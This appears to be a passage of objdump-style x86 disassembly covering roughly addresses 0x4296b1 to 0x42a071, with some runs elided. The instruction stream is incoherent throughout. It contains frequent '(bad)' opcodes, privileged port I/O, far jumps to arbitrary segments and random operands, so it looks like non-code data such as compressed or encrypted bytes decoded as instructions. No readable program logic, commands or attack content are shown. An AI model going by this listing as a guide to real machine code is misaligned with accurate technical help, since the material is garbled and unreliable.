  4296b1:	shr    edx,1
  4296b3:	cmp    BYTE PTR [edx],dh
  4296b5:	popf   
  4296b6:	(bad)  
  4296b7:	push   0x6f
  4296b9:	ror    BYTE PTR [eax+0x65],0xcd
  4296bd:	jge    0x4296d2
  4296bf:	scas   eax,DWORD PTR es:[edi]
  4296c0:	(bad)  
  4296c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296c2:	add    ah,BYTE PTR [ebp+edi*8-0x2f]
  4296c6:	cli    
  4296c7:	jmp    0x1f4:0x33d25459
  4296ce:	das    
  4296cf:	pop    edx
  4296d0:	mov    ds:0x10699c41,eax
  4296d5:	push   edx
  4296d6:	bound  esp,QWORD PTR [esi-0x47]
  4296d9:	and    al,0x5b
  4296db:	and    dh,BYTE PTR [edi-0x563d0ed9]
  4296e1:	push   es
  4296e2:	in     al,0x79
  4296e4:	addr16 dec ecx
  4296e6:	jae    0x42968c
  4296e8:	and    DWORD PTR [edi+0x6c],esp
  4296eb:	adc    dh,bh
  4296ed:	inc    ebx
  4296ee:	fisttp QWORD PTR [ebx-0x222f5c72]
  4296f4:	pop    edi
  4296f5:	inc    ecx
  4296f6:	adc    BYTE PTR [ebx+ebp*2+0x198413b7],bl
  4296fd:	fcos   
  4296ff:	ins    BYTE PTR es:[edi],dx
  429700:	cwde   
  429701:	sub    al,0xf3
  429703:	and    BYTE PTR [ebp-0xf],cl
  429706:	imul   esi,DWORD PTR [ecx+0x28],0x3b83e570
  42970d:	lds    esp,FWORD PTR [ecx]
  42970f:	mov    BYTE PTR [eax],bh
  429711:	adc    eax,DWORD PTR ds:[ebp-0xd]
  429715:	push   ds
  429716:	aad    0x23
  429718:	retf   
  429719:	inc    ecx
  42971a:	jmp    0x6c4e9a84
  42971f:	jno    0x4296db
  429721:	jp     0x42979e
  429723:	sbb    BYTE PTR [ebx],ah
  429725:	jnp    0x4296d1
  429727:	fsubp  st(5),st
  429729:	adc    DWORD PTR [edx-0x65],edi
  42972c:	cs cwde 
  42972e:	call   0x79915fb9
  429733:	mov    ?,WORD PTR ss:[ebx]
  429736:	retf   
  429737:	into   
  429738:	outs   dx,BYTE PTR ds:[esi]
  429739:	pusha  
  42973a:	ret    
  42973b:	sbb    ebp,DWORD PTR [edi-0x2c]
  42973e:	imul   edi
  429740:	rcr    BYTE PTR [ebp-0x41],1
  429743:	ret    0x835
  429746:	cmp    BYTE PTR [esp+edx*8+0x47ba40e7],0x9b
  42974e:	pusha  
  42974f:	xchg   edi,esp
  429751:	adc    al,0x82
  429753:	fcom   QWORD PTR [edi]
  429755:	mov    fs,WORD PTR [ebx+esi*1]
  429758:	mov    WORD PTR [ebp+0x27cbe03],es
  42975e:	das    
  42975f:	ret    0xfe2d
  429762:	adc    ebp,DWORD PTR [ebx]
  429764:	push   esp
  429765:	mov    ah,0xf3
  429767:	sbb    BYTE PTR [esi+edx*1],dl
  42976a:	mov    edx,0xcdffb43c
  42976f:	pop    ebx
  429770:	push   cs
  429771:	mov    esp,0x98a18887
  429776:	cmp    al,0xe6
  429778:	push   0x3a
  42977a:	stos   DWORD PTR es:[edi],eax
  42977b:	mov    bl,0x92
  42977d:	xor    al,0x36
  42977f:	push   0x24
  429781:	push   ebp
  429782:	imul   ebp,ebx,0xdc71914e
  429788:	test   ebx,eax
  42978a:	pop    ss
  42978b:	js     0x42978c
  42978d:	(bad)  
  42978e:	cmp    dh,BYTE PTR [edx+0xc9]
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	dec    ecx
  429801:	fidiv  DWORD PTR [esi]
  429803:	pop    ecx
  429804:	pop    edx
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	ficomp WORD PTR [eax-0x40]
  42980f:	push   ebp
  429810:	push   ebp
  429811:	inc    esp
  429812:	xor    BYTE PTR [ebx],dl
  429814:	pop    ebp
  429815:	xchg   esp,eax
  429816:	out    dx,eax
  429817:	(bad)  
  429818:	hlt    
  429819:	test   ebp,esp
  42981b:	loop   0x4297d6
  42981d:	sub    esp,DWORD PTR [esi-0x3d]
  429820:	cld    
  429821:	js     0x4297a4
  429823:	or     al,0x7f
  429825:	sbb    BYTE PTR [eax],ah
  429827:	xchg   esp,eax
  429828:	sbb    ah,BYTE PTR [ebp-0x5c48053]
  42982e:	mov    bh,bh
  429830:	mov    ebx,0x14508540
  429835:	imul   esp,ebp,0xffffff92
  429838:	cmp    edx,DWORD PTR [edx+0x6fb8fb04]
  42983e:	mov    cl,0xd2
  429840:	mov    ecx,0x20a5b84f
  429845:	jl     0x429884
  429847:	push   es
  429848:	cmp    ebx,edi
  42984a:	sub    al,0x1c
  42984c:	(bad)  
  42984d:	cmp    bh,al
  42984f:	(bad)  
  429850:	out    dx,eax
  429851:	mov    edi,0x39a6b613
  429856:	dec    esi
  429857:	lahf   
  429858:	mov    ecx,DWORD PTR ds:0xa0d59f21
  42985e:	add    edi,DWORD PTR [ebx]
  429860:	test   ebx,eax
  429862:	mov    bl,0x71
  429864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429865:	cli    
  429866:	ja     0x42981e
  429868:	fs xchg ebp,eax
  42986a:	push   esp
  42986b:	ror    DWORD PTR [ebp+0x4],0x50
  42986f:	xchg   edi,eax
  429870:	jmp    0x7543b166
  429875:	jo     0x429866
  429877:	test   DWORD PTR [esi-0x2bb668bb],ebx
  42987d:	cs in  eax,0xa2
  429880:	out    0xe5,al
  429882:	mov    dl,0x77
  429884:	sub    ecx,0x4c9f07b3
  42988a:	push   ss
  42988b:	cs int 0x12
  42988e:	and    BYTE PTR [esi-0x40],bh
  429891:	std    
  429892:	aaa    
  429893:	aad    0xf7
  429895:	or     al,0x5a
  429897:	jno    0x429825
  429899:	int3   
  42989a:	scas   eax,DWORD PTR es:[edi]
  42989b:	loop   0x429854
  42989d:	scas   al,BYTE PTR es:[edi]
  42989e:	cwde   
  42989f:	lods   al,BYTE PTR ds:[esi]
  4298a0:	cmp    dh,BYTE PTR [eax+ebx*2+0x74bc4bc5]
  4298a7:	out    0x8e,al
  4298a9:	js     0x4298e2
  4298ab:	sub    ch,BYTE PTR [eax]
  4298ad:	or     eax,0x4d348205
  4298b2:	jae    0x4298e9
  4298b4:	jl     0x429850
  4298b6:	jmp    0x54d1:0x9371f84d
  4298bd:	pusha  
  4298be:	das    
  4298bf:	dec    esp
  4298c0:	scas   eax,DWORD PTR es:[edi]
  4298c1:	ja     0x429859
  4298c3:	sbb    eax,DWORD PTR [esi+ebx*1+0x1d2417b]
  4298ca:	add    eax,0x806fd94b
  4298cf:	pusha  
  4298d0:	ins    BYTE PTR es:[edi],dx
  4298d1:	push   ebp
  4298d2:	sub    eax,0x6f43298e
  4298d7:	(bad)  
  4298d8:	aam    0x78
  4298da:	shl    dh,0xe5
  4298dd:	pop    esi
  4298de:	mov    bl,0xde
  4298e0:	test   eax,0x713b5297
  4298e5:	test   eax,0xa6fb2b33
  4298ea:	adc    BYTE PTR [edi],dl
  4298ec:	jle    0x4298db
  4298ee:	adc    al,dl
  4298f0:	stos   DWORD PTR es:[edi],eax
  4298f1:	jecxz  0x4298a9
  4298f3:	or     ecx,esi
  4298f5:	cs dec esp
  4298f7:	repnz fldcw WORD PTR [ebx-0x699ff05b]
  4298fe:	cmp    eax,0x60c8f4fd
  429903:	fs test eax,0x64eaac13
  429909:	inc    eax
  42990a:	cmp    DWORD PTR [ebx],ecx
  42990c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42990d:	sar    BYTE PTR [edi],cl
  42990f:	cdq    
  429910:	dec    ebp
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	inc    esi
  429981:	ja     0x429959
  429983:	imul   ebx,DWORD PTR [edi-0x43],0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	popa   
  42998d:	rcl    BYTE PTR [esi],1
  42998f:	add    ch,BYTE PTR [ecx]
  429991:	mov    ?,WORD PTR [esi+edx*8+0x7797b764]
  429998:	jmp    0xd43b5672
  42999d:	mov    BYTE PTR [ebx+0x2],ah
  4299a0:	retf   0x8338
  4299a3:	xlat   BYTE PTR ds:[ebx]
  4299a4:	adc    ch,dh
  4299a6:	inc    esi
  4299a7:	outs   dx,DWORD PTR ds:[esi]
  4299a8:	and    dl,BYTE PTR [ecx]
  4299aa:	in     al,dx
  4299ab:	dec    edx
  4299ac:	xor    eax,0xc76218fc
  4299b1:	(bad)  
  4299b2:	ins    BYTE PTR es:[edi],dx
  4299b3:	mov    ds:0x748587b3,eax
  4299b8:	jle    0x429a09
  4299ba:	(bad)  
  4299bb:	shr    eax,cl
  4299bd:	loop   0x429a0f
  4299bf:	inc    ebp
  4299c0:	imul   edi,DWORD PTR [ebp+0x5f2bf600],0x33
  4299c7:	out    dx,al
  4299c8:	in     al,0x9b
  4299ca:	(bad)  
  4299cb:	not    edx
  4299cd:	pop    es
  4299ce:	fbstp  TBYTE PTR [ebx]
  4299d0:	pop    edi
  4299d1:	pop    esp
  4299d2:	mov    eax,0xfb80505c
  4299d7:	or     DWORD PTR [ebx+0x1d2df440],esp
  4299dd:	ins    DWORD PTR es:[edi],dx
  4299de:	jae    0x4299ec
  4299e0:	test   DWORD PTR [edi+ebp*1-0x4b2a9409],edi
  4299e7:	into   
  4299e8:	jnp    0x429a2f
  4299ea:	xchg   edi,eax
  4299eb:	sar    BYTE PTR [esi+ecx*2],0x14
  4299ef:	addr16 push ecx
  4299f1:	push   ds
  4299f2:	pop    ecx
  4299f3:	enter  0xd02e,0xcb
  4299f7:	sahf   
  4299f8:	and    BYTE PTR [edi+0x31dd2208],0x62
  4299ff:	mov    ebp,0x9e7f2ae8
  429a04:	popa   
  429a05:	cmp    dl,ch
  429a07:	push   ebp
  429a08:	jbe    0x429a62
  429a0a:	pop    esp
  429a0b:	inc    edx
  429a0c:	jl     0x4299dc
  429a0e:	test   dh,0xf1
  429a11:	call   FWORD PTR [esi+0x6c]
  429a14:	and    al,0x63
  429a16:	inc    ebp
  429a17:	sub    ecx,0xb693b711
  429a1d:	mov    esp,0x48a2443f
  429a22:	adc    DWORD PTR [ebx+0x3e6527d2],edx
  429a28:	repz out 0xf3,al
  429a2b:	cmp    eax,DWORD PTR [edx]
  429a2d:	aad    0x1c
  429a2f:	push   esp
  429a30:	pop    edi
  429a31:	adc    DWORD PTR [eax-0x3e],edi
  429a34:	xchg   edi,eax
  429a35:	add    ebp,DWORD PTR [ebx]
  429a37:	sub    bh,BYTE PTR [edx+0x64ab268a]
  429a3d:	push   0xe370017
  429a42:	cwde   
  429a43:	nop
  429a44:	sti    
  429a45:	and    DWORD PTR [ebx],0x35be9902
  429a4b:	dec    edx
  429a4c:	mov    ebp,0x337dc269
  429a51:	leave  
  429a52:	mov    edi,DWORD PTR [ebx]
  429a54:	mov    eax,ds:0x5ac11c08
  429a59:	in     eax,dx
  429a5a:	ret    
  429a5b:	(bad)  
  429a5c:	xchg   edx,eax
  429a5d:	jo     0x429ac8
  429a5f:	xchg   esp,eax
  429a60:	or     BYTE PTR [edx],ah
  429a62:	mov    edi,0x41573b79
  429a67:	dec    ecx
  429a68:	sub    DWORD PTR ds:0x56e06d84,edi
  429a6e:	add    edx,esi
  429a70:	iret   
  429a71:	cmp    BYTE PTR [edx+0x4bf3bbf8],dh
  429a77:	jl     0x429ac8
  429a79:	int    0xeb
  429a7b:	cld    
  429a7c:	push   0xffffff98
  429a7e:	sub    bl,BYTE PTR [edi-0x7]
  429a81:	scas   al,BYTE PTR es:[edi]
  429a82:	inc    esp
  429a83:	or     eax,0xba82ed58
  429a88:	sub    al,0x38
  429a8a:	cld    
  429a8b:	cwde   
  429a8c:	jge    0x429ad6
  429a8e:	cmp    ecx,ecx
  429a90:	imul   eax,DWORD PTR [eax],0x0
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xd0a95667
  429b01:	xor    eax,0xbe64b8cf
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    eax,0xb2000001
  429b0d:	retf   
  429b0e:	enter  0xd952,0x94
  429b12:	icebp  
  429b13:	sub    eax,0x79e08bb5
  429b18:	fisub  DWORD PTR [ecx-0x14]
  429b1b:	push   esp
  429b1c:	test   al,0x18
  429b1e:	adc    al,0x14
  429b20:	int    0x46
  429b22:	cli    
  429b23:	jns    0x429b80
  429b25:	cld    
  429b26:	jp     0x429b85
  429b28:	sahf   
  429b29:	out    0xd4,eax
  429b2b:	mov    ch,0xdf
  429b2d:	pop    edx
  429b2e:	neg    DWORD PTR [esi+0x1394e03f]
  429b34:	cmp    ebx,DWORD PTR [ebp+ecx*8+0x2e179d5]
  429b3b:	test   BYTE PTR [edx+0x70],ch
  429b3e:	dec    ecx
  429b3f:	repnz push 0x9e3c131f
  429b45:	(bad)  
  429b47:	dec    edx
  429b48:	sub    edi,DWORD PTR [ebp-0x4cc3b6e2]
  429b4e:	mov    ds:0xf32a5b2c,al
  429b53:	pop    esi
  429b54:	push   ebp
  429b55:	pop    es
  429b56:	cmp    ch,bl
  429b58:	mov    DWORD PTR [ebx-0x55bf87da],esi
  429b5e:	test   al,0x59
  429b60:	lods   al,BYTE PTR ds:[esi]
  429b61:	adc    ch,BYTE PTR [eax]
  429b63:	enter  0x4f3b,0x49
  429b67:	and    al,0xea
  429b69:	(bad)  
  429b6a:	ret    0xdc7c
  429b6d:	pop    ecx
  429b6e:	pop    ss
  429b6f:	test   eax,0xa099ab71
  429b74:	add    al,0xb0
  429b76:	ins    DWORD PTR es:[edi],dx
  429b77:	pop    ebp
  429b78:	cmp    DWORD PTR [eax+ecx*8],edx
  429b7b:	mov    ch,0xf9
  429b7d:	add    ebx,DWORD PTR [edx+0x5cda7551]
  429b83:	sahf   
  429b84:	lock outs dx,DWORD PTR ds:[esi]
  429b86:	aam    0x7f
  429b88:	cmp    eax,0xcb48c84a
  429b8d:	jo     0x429b23
  429b8f:	(bad)  
  429b90:	out    0x52,al
  429b92:	adc    al,0x34
  429b94:	aaa    
  429b95:	or     dh,al
  429b97:	retf   0x3b14
  429b9a:	xchg   ecx,eax
  429b9b:	xchg   al,cl
  429b9d:	jle    0x429b7d
  429b9f:	jo     0x429bc8
  429ba1:	jb     0x429b26
  429ba3:	icebp  
  429ba4:	cld    
  429ba5:	pusha  
  429ba6:	retf   
  429ba7:	mov    ch,ch
  429ba9:	xchg   ebx,eax
  429baa:	inc    edi
  429bab:	(bad)  [eax-0xd7c41a1]
  429bb1:	mov    eax,0x5fa293f
  429bb6:	(bad)  
  429bb7:	lods   al,BYTE PTR ds:[esi]
  429bb8:	ds clc 
  429bba:	xor    eax,0x2c46dba6
  429bbf:	push   esi
  429bc0:	add    edx,eax
  429bc2:	sub    BYTE PTR [ebp-0x78e4b6e1],bh
  429bc8:	dec    ebx
  429bc9:	fwait
  429bca:	lahf   
  429bcb:	repnz mov eax,ds:0x9d70f1bb
  429bd1:	xor    eax,0x6ee6d062
  429bd6:	test   ah,ah
  429bd8:	(bad)  
  429bd9:	out    dx,eax
  429bda:	adc    eax,0x31b447a4
  429bdf:	add    DWORD PTR ds:0xdd8bd3d4,edx
  429be5:	jle    0x429c05
  429be7:	dec    ebp
  429be8:	jns    0x429c1f
  429bea:	aas    
  429beb:	xor    DWORD PTR [eax],edx
  429bed:	loop   0x429bec
  429bef:	cmp    al,0x3d
  429bf1:	(bad)  
  429bf3:	or     BYTE PTR [esi-0x1a],bh
  429bf6:	cmp    al,0x26
  429bf8:	mov    ?,ebp
  429bfa:	push   edi
  429bfb:	jno    0x429c76
  429bfd:	jne    0x429bdb
  429bff:	or     BYTE PTR [esi+0x0],dl
  429c02:	popa   
  429c03:	aas    
  429c04:	mov    bl,BYTE PTR [ebx-0x4b]
  429c07:	aad    0xa3
  429c09:	bound  esi,QWORD PTR [esi]
  429c0b:	add    edx,DWORD PTR [ecx]
  429c0d:	or     DWORD PTR [esi+ecx*1],esi
  429c10:	test   DWORD PTR [eax],eax
	...
  429c72:	add    BYTE PTR [eax],al
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [edx],dh
  429c81:	test   BYTE PTR cs:[ecx],dl
  429c84:	imul   edi,DWORD PTR [edi+0x1050001],0x5e5b0000
  429c8e:	cmp    al,0x7b
  429c90:	imul   ecx,DWORD PTR [esi-0x55],0x1b
  429c94:	lock daa 
  429c96:	mov    bh,0x1e
  429c98:	cld    
  429c99:	sub    BYTE PTR [edx-0x41],0x6e
  429c9d:	jg     0x429c34
  429c9f:	ins    DWORD PTR es:[edi],dx
  429ca0:	(bad)  
  429ca1:	imul   esp,DWORD PTR [ecx-0x38],0xad4d1175
  429ca8:	jmp    0xf7c57ba0
  429cad:	bound  eax,QWORD PTR [edi]
  429caf:	pop    ds
  429cb0:	xchg   DWORD PTR [eax],eax
  429cb2:	dec    ebx
  429cb3:	mov    al,BYTE PTR [edi+0xb3d02ff]
  429cb9:	sbb    ebx,esi
  429cbb:	or     eax,0x39d0b6f5
  429cc0:	jmp    0xff0f:0x926e67bf
  429cc7:	sti    
  429cc8:	xchg   esp,eax
  429cc9:	cmp    BYTE PTR [ecx-0x10c28a8c],dl
  429ccf:	jns    0x429ca0
  429cd1:	xor    DWORD PTR es:[ebp+0x282992f9],0xa5996c10
  429cdc:	fwait
  429cdd:	xor    DWORD PTR [edx],ecx
  429cdf:	lods   al,BYTE PTR ds:[esi]
  429ce0:	test   eax,0x47d56c20
  429ce5:	xor    dh,bl
  429ce7:	test   BYTE PTR [ebp+0xa8c2b68],ch
  429ced:	adc    eax,0xa4541923
  429cf2:	inc    ebp
  429cf3:	(bad)  
  429cf4:	out    0xbc,al
  429cf6:	inc    ebp
  429cf7:	and    DWORD PTR [edi+0x5deff1b0],esi
  429cfd:	call   0x76f1:0x8db52dde
  429d04:	add    DWORD PTR ds:[esi+ebx*4+0x24bb1a2d],0xffffffe1
  429d0d:	push   eax
  429d0e:	mov    cl,0x79
  429d10:	xlat   BYTE PTR ds:[ebx]
  429d11:	mov    dh,BYTE PTR [eax-0x9a4ccd0]
  429d17:	lock adc eax,0xf7ea3c74
  429d1d:	cdq    
  429d1e:	and    eax,0x5d543f88
  429d23:	adc    al,0xd4
  429d25:	test   ebp,esp
  429d27:	dec    BYTE PTR [ecx-0x10f5ebed]
  429d2d:	jnp    0x429d54
  429d2f:	jo     0x429cf4
  429d31:	outs   dx,DWORD PTR ds:[esi]
  429d32:	nop
  429d33:	dec    esp
  429d34:	aam    0x21
  429d36:	dec    esp
  429d37:	push   ss
  429d38:	pop    ss
  429d39:	pusha  
  429d3a:	jno    0x429d6d
  429d3c:	clc    
  429d3d:	inc    esp
  429d3e:	or     DWORD PTR [edi-0x71],edi
  429d41:	std    
  429d42:	adc    al,0xfd
  429d44:	sbb    ah,BYTE PTR [edi]
  429d46:	pop    esi
  429d47:	mov    dl,0x90
  429d49:	push   cs
  429d4a:	fild   WORD PTR [ebx+0x38]
  429d4d:	mov    ch,BYTE PTR [ebp-0x48]
  429d50:	shr    BYTE PTR [edi-0x576adb9d],1
  429d56:	cmp    al,BYTE PTR [edi-0x56728547]
  429d5c:	mov    ebp,0xb649b409
  429d61:	cmp    BYTE PTR es:[ebx],cl
  429d64:	mov    bh,0x70
  429d66:	inc    eax
  429d67:	sbb    al,0xa8
  429d69:	pop    ecx
  429d6a:	inc    ecx
  429d6b:	or     ebx,DWORD PTR [ecx]
  429d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d6e:	dec    edi
  429d6f:	icebp  
  429d70:	jbe    0x429d03
  429d72:	sub    BYTE PTR [edi-0x32],ch
  429d75:	es mov bl,bh
  429d78:	sub    eax,0xac9ae59f
  429d7d:	out    0x3f,eax
  429d7f:	mov    ds:0x321e79d8,al
  429d84:	out    0xc6,al
  429d86:	cs pop edx
  429d88:	pop    ss
  429d89:	sbb    BYTE PTR [ebx-0x1700a354],bl
  429d8f:	shl    DWORD PTR [esi+0x0],1
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	cli    
  429e01:	dec    esp
  429e02:	and    eax,0x1c06ebb
  429e07:	add    BYTE PTR ds:0x3c000001,al
  429e0d:	push   edx
  429e0e:	clc    
  429e0f:	shl    BYTE PTR [edi+0x40884aa1],0xfd
  429e16:	or     DWORD PTR [edx],eax
  429e18:	xor    al,0x79
  429e1a:	mul    DWORD PTR [edx-0x7cffa515]
  429e20:	add    edx,DWORD PTR [edx+0x4b]
  429e23:	push   es
  429e24:	fsubr  st,st(7)
  429e26:	pop    ebx
  429e27:	pop    esp
  429e28:	sub    dl,BYTE PTR [eax+0x2c]
  429e2b:	and    dh,BYTE PTR [edi+0x5e]
  429e2e:	jge    0x429e61
  429e30:	jb     0x429db7
  429e32:	stos   BYTE PTR es:[edi],al
  429e33:	stos   DWORD PTR es:[di],eax
  429e35:	fs push ebp
  429e37:	xchg   ebx,eax
  429e38:	imul   esp,DWORD PTR [edx],0x1d
  429e3b:	jae    0x429e04
  429e3d:	stos   BYTE PTR es:[edi],al
  429e3e:	dec    esp
  429e3f:	push   ebp
  429e40:	dec    DWORD PTR ds:0xd2fb8943
  429e46:	xor    esi,edx
  429e48:	cdq    
  429e49:	push   esi
  429e4a:	rol    BYTE PTR [ecx+ecx*2],cl
  429e4d:	test   DWORD PTR [eax],esp
  429e4f:	dec    ebp
  429e50:	mov    edi,0xfc5d3dda
  429e55:	sbb    edx,esi
  429e57:	ds (bad) 
  429e59:	aam    0xa3
  429e5b:	hlt    
  429e5c:	xor    DWORD PTR [eax+0x13],ecx
  429e5f:	(bad)  
  429e60:	jno    0x429de4
  429e62:	mov    ds:0xf1de96d7,al
  429e67:	adc    DWORD PTR [edi-0x66],0xf6b9bbd2
  429e6e:	ficom  DWORD PTR [eax+0x67902f08]
  429e74:	sbb    DWORD PTR [eax+eiz*1-0x46],0xbbb5c970
  429e7c:	ror    BYTE PTR [ebx-0x7b],1
  429e7f:	sub    al,0xc4
  429e81:	scas   al,BYTE PTR es:[edi]
  429e82:	retf   0x77af
  429e85:	ret    
  429e86:	pop    esp
  429e87:	mov    ebp,0x22e50a6b
  429e8c:	ss popa 
  429e8e:	(bad)  
  429e8f:	xchg   ecx,eax
  429e90:	pop    ebx
  429e91:	(bad)  
  429e92:	mov    cl,0xb8
  429e94:	aam    0xcd
  429e96:	lahf   
  429e97:	pop    ds
  429e98:	cmp    dh,BYTE PTR ds:[esi-0x57e0693a]
  429e9f:	adc    DWORD PTR [ecx],0xfffffff9
  429ea2:	mov    ch,0x47
  429ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ea5:	sbb    esi,DWORD PTR [ebp+0x2f6e85fe]
  429eab:	pop    esp
  429eac:	adc    bl,BYTE PTR [edx-0x7dc74692]
  429eb2:	push   cs
  429eb3:	jne    0x429e9f
  429eb5:	jecxz  0x429ef3
  429eb7:	out    0x8f,eax
  429eb9:	in     eax,0x35
  429ebb:	push   ebx
  429ebc:	leave  
  429ebd:	daa    
  429ebe:	lods   al,BYTE PTR ds:[esi]
  429ebf:	and    bl,BYTE PTR [eax+0x6d5c1dee]
  429ec5:	jns    0x429e85
  429ec7:	ja     0x429ee7
  429ec9:	push   0xffffffee
  429ecb:	jl     0x429f14
  429ecd:	sbb    ecx,DWORD PTR [eax+0x421d5874]
  429ed3:	(bad)  
  429ed4:	retf   0x1f8
  429ed7:	xor    dl,dh
  429ed9:	cli    
  429eda:	push   eax
  429edb:	inc    ecx
  429edc:	leave  
  429edd:	push   ecx
  429ede:	mov    DWORD PTR [edx+edi*4+0x7296fcd3],ecx
  429ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ee6:	sub    DWORD PTR gs:[ebx],eax
  429ee9:	ret    0x1ef3
  429eec:	add    al,0x12
  429eee:	not    DWORD PTR [eax]
  429ef0:	cdq    
  429ef1:	sahf   
  429ef2:	cmp    DWORD PTR [esi-0x43],ecx
  429ef5:	lahf   
  429ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ef7:	xchg   ebp,eax
  429ef8:	push   es
  429ef9:	into   
  429efa:	cmp    al,0x7c
  429efc:	push   0x26f077b6
  429f01:	aas    
  429f02:	add    eax,0x47f1f660
  429f07:	push   ds
  429f08:	mov    dl,0x37
  429f0a:	pop    es
  429f0b:	int3   
  429f0c:	jecxz  0x429ea2
  429f0e:	fstp   DWORD PTR [ebx]
  429f10:	sbb    eax,DWORD PTR [eax]
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x1762c361]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x76000001
  429f8d:	(bad)  
  429f8e:	stos   DWORD PTR es:[edi],eax
  429f8f:	ins    DWORD PTR es:[edi],dx
  429f90:	mov    ch,0xaa
  429f92:	je     0x429f1d
  429f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f95:	scas   eax,DWORD PTR es:[edi]
  429f96:	add    bh,BYTE PTR [edx-0x7a]
  429f99:	mov    esi,0xb966032b
  429f9e:	repnz call FWORD PTR [ecx-0x7]
  429fa2:	add    BYTE PTR [ecx+0x1f3d79ea],dl
  429fa8:	dec    ecx
  429fa9:	sub    BYTE PTR [eax],0xc3
  429fac:	ja     0x42a006
  429fae:	mov    ?,WORD PTR [esi-0x34]
  429fb1:	retf   0x589d
  429fb4:	xchg   ecx,eax
  429fb5:	loope  0x42a009
  429fb7:	mov    ds:0x929ab31f,al
  429fbc:	xchg   ecx,eax
  429fbd:	mov    ah,0x75
  429fbf:	or     BYTE PTR [edx+0x77b5bb67],bh
  429fc5:	dec    esp
  429fc6:	adc    BYTE PTR [edx],cl
  429fc8:	clc    
  429fc9:	fcmovbe st,st(4)
  429fcb:	or     BYTE PTR [esi],0x69
  429fce:	bound  edx,QWORD PTR [edi]
  429fd0:	xlat   BYTE PTR ds:[ebx]
  429fd1:	shl    DWORD PTR [ecx],cl
  429fd3:	lea    ecx,ds:0x54652415
  429fd9:	(bad)  
  429fda:	pop    ss
  429fdb:	jmp    0x7c9b:0x276646d0
  429fe2:	and    bh,BYTE PTR [ecx]
  429fe4:	inc    esp
  429fe5:	addr16 imul eax,esi
  429fe9:	fisttp DWORD PTR [ebx]
  429feb:	(bad)  
  429fec:	std    
  429fed:	aas    
  429fee:	std    
  429fef:	hlt    
  429ff0:	mov    edi,0x72ef81b5
  429ff5:	pop    edi
  429ff6:	retf   0x1927
  429ff9:	mov    edx,edx
  429ffb:	jno    0x429f8f
  429ffd:	fcmovbe st,st(6)
  429fff:	and    esi,0x8032eca2
  42a005:	jo     0x429fd4
  42a007:	jae    0x429fb2
  42a009:	stos   DWORD PTR es:[edi],eax
  42a00a:	(bad)  
  42a00b:	push   0x21
  42a00d:	jne    0x42a042
  42a00f:	pusha  
  42a010:	lock mov ebx,ebp
  42a013:	jecxz  0x429ff0
  42a015:	xchg   ecx,eax
  42a016:	jecxz  0x42a05a
  42a018:	dec    edi
  42a019:	mov    bl,0x20
  42a01b:	lods   eax,DWORD PTR ds:[esi]
  42a01d:	pop    ds
  42a01e:	mov    ecx,?
  42a020:	lods   al,BYTE PTR ds:[esi]
  42a021:	xor    DWORD PTR [edi-0x5bd0340d],0x68
  42a028:	push   ebx
  42a029:	inc    edi
  42a02a:	mov    bl,BYTE PTR gs:[eax]
  42a02d:	jbe    0x429fb8
  42a02f:	cmp    DWORD PTR [ebx+0x7a],esi
  42a032:	push   ds
  42a033:	xchg   DWORD PTR [ecx+0x40],eax
  42a036:	scas   al,BYTE PTR es:[edi]
  42a037:	sbb    BYTE PTR ds:0x11bd13a2,dl
  42a03d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a03e:	push   ss
  42a03f:	mov    ds:0x36deabe5,eax
  42a044:	mov    bh,0x9a
  42a046:	hlt    
  42a047:	sti    
  42a048:	test   al,0xa2
  42a04a:	cmp    BYTE PTR [edi],al
  42a04c:	fist   DWORD PTR [ebx]
  42a04e:	mov    ch,BYTE PTR [esi+ebx*1+0x13]
  42a052:	inc    esp
  42a053:	and    ebp,DWORD PTR [ebx+0x8]
  42a056:	jle    0x42a0c5
  42a058:	cmp    DWORD PTR [eax-0x54],eax
  42a05b:	ins    DWORD PTR es:[edi],dx
  42a05c:	out    dx,al
  42a05d:	sahf   
  42a05e:	or     eax,DWORD PTR [esi-0x64]
  42a061:	ret    
  42a062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a063:	(bad)  
  42a064:	in     eax,0x62
  42a066:	inc    ebx
  42a067:	sub    DWORD PTR [ebx],eax
  42a069:	imul   edx,ebx,0xffffffe2
  42a06c:	add    al,BYTE PTR [ebx]
  42a06e:	pop    ds
  42a06f:	(bad)  
  42a071:	mov    ebp,0x550a7f54
